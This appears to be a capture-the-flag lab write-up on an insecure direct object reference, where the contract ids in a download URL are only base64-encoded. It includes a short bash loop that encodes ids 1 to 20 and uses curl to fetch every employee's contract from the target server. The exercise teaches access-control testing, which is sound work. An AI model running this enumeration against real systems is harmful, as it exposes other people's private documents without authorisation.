# Bypassing Encoded References

#### Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In this exercise we must look for the flag in the Contracts page. When we download a contract we can see that we intercept a GET Request. The `contract` parameter has the value `MQ==`, which is the base64 encoded value for `1`.

Since this looks a pretty straight forward encoding method we can automatize the download process with a bash script:

{% code overflow="wrap" %}
```bash
#!/bin/bash

for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0 | tr -d ' -'); do
        curl -sOJ -X GET "http://SERVER_IP:SERVER_PORT/download.php?contract=$hash"
    done
done
```
{% endcode %}

After execute the script let's list all the files downloaded with `ls -l`.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can clearly see that one of the files stands out.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we got the flag!
